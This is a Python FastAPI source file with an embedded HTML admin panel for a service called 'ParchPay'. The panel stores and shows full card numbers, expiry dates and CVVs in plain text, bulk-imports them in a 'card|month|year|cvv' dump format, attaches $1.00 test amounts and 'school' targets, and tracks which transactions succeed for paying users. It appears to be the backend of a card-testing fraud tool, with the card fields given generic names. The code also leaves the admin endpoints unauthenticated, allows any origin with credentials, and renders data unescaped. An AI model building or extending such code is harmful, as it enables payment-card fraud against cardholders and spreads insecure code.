# api/index.py
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from .auth import router as auth_router
from .records import router as records_router
from .data import seed_demo_data

app = FastAPI(redirect_slashes=False)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.include_router(auth_router)
app.include_router(records_router)

# ---------- Admin HTML panel ----------
@app.get("/admin", response_class=HTMLResponse)
async def admin_panel():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ParchPay Admin</title>
    <style>
        body { font-family: system-ui, -apple-system, sans-serif; max-width: 1200px; margin: 40px auto; padding: 0 20px; background: #f8f9fa; color: #1a1a1a; }
        h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
        .tabs { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        .tab-btn { padding: 10px 20px; background: #e9ecef; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
        .tab-btn.active { background: #3498db; color: white; }
        .tab-content { display: none; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .tab-content.active { display: block; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #dee2e6; }
        th { background: #f1f3f5; font-weight: 600; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: 500; margin-bottom: 4px; }
        input, select, textarea { width: 100%; padding: 8px 12px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: 600; }
        button:hover { background: #2980b9; }
        .status { margin-top: 10px; padding: 10px; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 12px; font-weight: 600; }
        .badge-pending { background: #ffc107; color: #856404; }
        .badge-success { background: #28a745; color: white; }
        .badge-failed { background: #dc3545; color: white; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 700px) { .grid-2 { grid-template-columns: 1fr; } }
        .mono { font-family: monospace; font-size: 13px; }
    </style>
</head>
<body>
    <h1>🧾 ParchPay Admin Panel</h1>
    <p><em>Demo admin interface – all data is in memory and resets on each deploy.</em></p>

    <div class="tabs">
        <button class="tab-btn active" data-tab="users">👥 Users</button>
        <button class="tab-btn" data-tab="records">💳 Records</button>
        <button class="tab-btn" data-tab="add-record">➕ Add Record</button>
        <button class="tab-btn" data-tab="csv-import">📂 CSV Import</button>
        <button class="tab-btn" data-tab="topup">💰 Top Up</button>
    </div>

    <!-- Users Tab -->
    <div id="users" class="tab-content active">
        <h2>Users</h2>
        <div id="users-list">Loading…</div>
    </div>

    <!-- Records Tab -->
    <div id="records" class="tab-content">
        <h2>Records</h2>
        <div id="records-list">Loading…</div>
    </div>

    <!-- Add Record Tab -->
    <div id="add-record" class="tab-content">
        <h2>Add a new card record</h2>
        <form id="add-record-form">
            <div class="grid-2">
                <div class="form-group">
                    <label for="userId">User ID (optional, defaults to 1)</label>
                    <input type="number" id="userId" placeholder="Leave empty for default user">
                </div>
                <div class="form-group">
                    <label for="identifier">Card Number *</label>
                    <input type="text" id="identifier" placeholder="4111111111111111" required>
                </div>
                <div class="form-group">
                    <label for="field_a">Expiry Month *</label>
                    <input type="text" id="field_a" placeholder="12" required>
                </div>
                <div class="form-group">
                    <label for="field_b">Expiry Year *</label>
                    <input type="text" id="field_b" placeholder="26" required>
                </div>
                <div class="form-group">
                    <label for="field_c">CVV *</label>
                    <input type="text" id="field_c" placeholder="123" required>
                </div>
                <div class="form-group">
                    <label for="school">School</label>
                    <input type="text" id="school" placeholder="Optional">
                </div>
                <div class="form-group">
                    <label for="requested_amount">Requested Amount</label>
                    <input type="number" step="0.01" id="requested_amount" value="1.00">
                </div>
            </div>
            <button type="submit">Add Record</button>
        </form>
        <div id="add-status" class="status"></div>
    </div>

    <!-- CSV Import Tab -->
    <div id="csv-import" class="tab-content">
        <h2>Import from CSV</h2>
        <p>Format: <code>card_number|month|year|cvv|school|amount</code> (school and amount optional). One record per line.</p>
        <textarea id="csv-data" rows="10" style="width:100%; font-family:monospace; padding:8px;" placeholder="41111111111111101|02|26|101|Demo School|1.00
41111111111111102|02|26|102"></textarea>
        <br><br>
        <button id="csv-import-btn">Import</button>
        <div id="csv-status" class="status"></div>
    </div>

    <!-- Top Up Tab -->
    <div id="topup" class="tab-content">
        <h2>Top up a user's balance</h2>
        <form id="topup-form">
            <div class="grid-2">
                <div class="form-group">
                    <label for="topup-username">Username *</label>
                    <input type="text" id="topup-username" required>
                </div>
                <div class="form-group">
                    <label for="topup-amount">Amount (USD) *</label>
                    <input type="number" step="0.01" id="topup-amount" required>
                </div>
            </div>
            <button type="submit">Top Up</button>
        </form>
        <div id="topup-status" class="status"></div>
    </div>

    <script>
        const API_BASE = window.location.origin;

        async function fetchJSON(url, options = {}) {
            const res = await fetch(url, options);
            if (!res.ok) {
                const text = await res.text();
                throw new Error(text || res.statusText);
            }
            return res.json();
        }

        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                document.getElementById(btn.dataset.tab).classList.add('active');
                if (btn.dataset.tab === 'users') loadUsers();
                if (btn.dataset.tab === 'records') loadRecords();
            });
        });

        async function loadUsers() {
            const container = document.getElementById('users-list');
            try {
                const users = await fetchJSON(`${API_BASE}/api/extension/records/admin/users`);
                if (!users.length) {
                    container.innerHTML = '<p>No users found.</p>';
                    return;
                }
                let html = `<table><thead><tr>
                    <th>ID</th><th>Username</th><th>Balance</th><th>API Key</th><th>Active</th>
                </tr></thead><tbody>`;
                users.forEach(u => {
                    html += `<tr>
                        <td>${u.id}</td>
                        <td>${u.username}</td>
                        <td>$${u.balance.toFixed(2)}</td>
                        <td class="mono">${u.apiKey}</td>
                        <td>${u.isActive ? '✅' : '❌'}</td>
                    </tr>`;
                });
                html += '</tbody></table>';
                container.innerHTML = html;
            } catch (err) {
                container.innerHTML = `<div class="error">Failed to load users: ${err.message}</div>`;
            }
        }

        async function loadRecords() {
            const container = document.getElementById('records-list');
            try {
                const records = await fetchJSON(`${API_BASE}/api/extension/records/admin/records`);
                if (!records.length) {
                    container.innerHTML = '<p>No records found.</p>';
                    return;
                }
                let html = `<table><thead><tr>
                    <th>ID</th><th>User ID</th><th>Card</th><th>Month</th><th>Year</th><th>CVV</th>
                    <th>School</th><th>Amount</th><th>Status</th><th>Tx ID</th><th>Message</th>
                </tr></thead><tbody>`;
                records.forEach(r => {
                    const statusClass = r.status === 'success' ? 'badge-success' : r.status === 'failed' ? 'badge-failed' : 'badge-pending';
                    html += `<tr>
                        <td>${r.id}</td>
                        <td>${r.userId}</td>
                        <td class="mono">${r.identifier}</td>
                        <td>${r.field_a}</td>
                        <td>${r.field_b}</td>
                        <td>${r.field_c}</td>
                        <td>${r.school || ''}</td>
                        <td>$${r.requested_amount.toFixed(2)}</td>
                        <td><span class="badge ${statusClass}">${r.status}</span></td>
                        <td class="mono">${r.transaction_id || ''}</td>
                        <td>${r.message || ''}</td>
                    </tr>`;
                });
                html += '</tbody></table>';
                container.innerHTML = html;
            } catch (err) {
                container.innerHTML = `<div class="error">Failed to load records: ${err.message}</div>`;
            }
        }

        // Add Record
        document.getElementById('add-record-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const status = document.getElementById('add-status');
            status.textContent = 'Submitting…';
            status.className = 'status';

            const payload = {
                user_id: document.getElementById('userId').value ? parseInt(document.getElementById('userId').value) : null,
                identifier: document.getElementById('identifier').value,
                field_a: document.getElementById('field_a').value,
                field_b: document.getElementById('field_b').value,
                field_c: document.getElementById('field_c').value,
                school: document.getElementById('school').value,
                requested_amount: parseFloat(document.getElementById('requested_amount').value) || 0,
            };
            try {
                const result = await fetchJSON(`${API_BASE}/api/extension/records/admin/records`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                status.textContent = `✅ Record added successfully (ID: ${result.id})`;
                status.className = 'status success';
                document.getElementById('add-record-form').reset();
                if (document.getElementById('records').classList.contains('active')) loadRecords();
            } catch (err) {
                status.textContent = `❌ Error: ${err.message}`;
                status.className = 'status error';
            }
        });

        // CSV Import
        document.getElementById('csv-import-btn').addEventListener('click', async () => {
            const csvData = document.getElementById('csv-data').value;
            const status = document.getElementById('csv-status');
            status.textContent = 'Importing...';
            status.className = 'status';
            try {
                const result = await fetchJSON(`${API_BASE}/api/extension/records/admin/import-csv`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ csv_data: csvData })
                });
                let msg = `✅ Imported ${result.created.length} records.`;
                if (result.errors.length) {
                    msg += ` Errors: ${result.errors.join('; ')}`;
                }
                status.textContent = msg;
                status.className = 'status success';
                if (document.getElementById('records').classList.contains('active')) loadRecords();
            } catch (err) {
                status.textContent = '❌ Error: ' + err.message;
                status.className = 'status error';
            }
        });

        // Top Up
        document.getElementById('topup-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const status = document.getElementById('topup-status');
            status.textContent = 'Submitting…';
            status.className = 'status';

            const payload = {
                username: document.getElementById('topup-username').value,
                amount: parseFloat(document.getElementById('topup-amount').value),
            };
            try {
                const result = await fetchJSON(`${API_BASE}/api/extension/records/admin/topup`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                status.textContent = `✅ Balance updated. New balance: $${result.new_balance}`;
                status.className = 'status success';
                document.getElementById('topup-form').reset();
                if (document.getElementById('users').classList.contains('active')) loadUsers();
            } catch (err) {
                status.textContent = `❌ Error: ${err.message}`;
                status.className = 'status error';
            }
        });

        // Initial load
        loadUsers();
        document.querySelector('[data-tab="records"]').addEventListener('click', loadRecords);
    </script>
</body>
</html>
    """

@app.get("/")
async def root():
    return {"message": "ParchPay API is running. Admin panel at /admin"}

seed_demo_data()
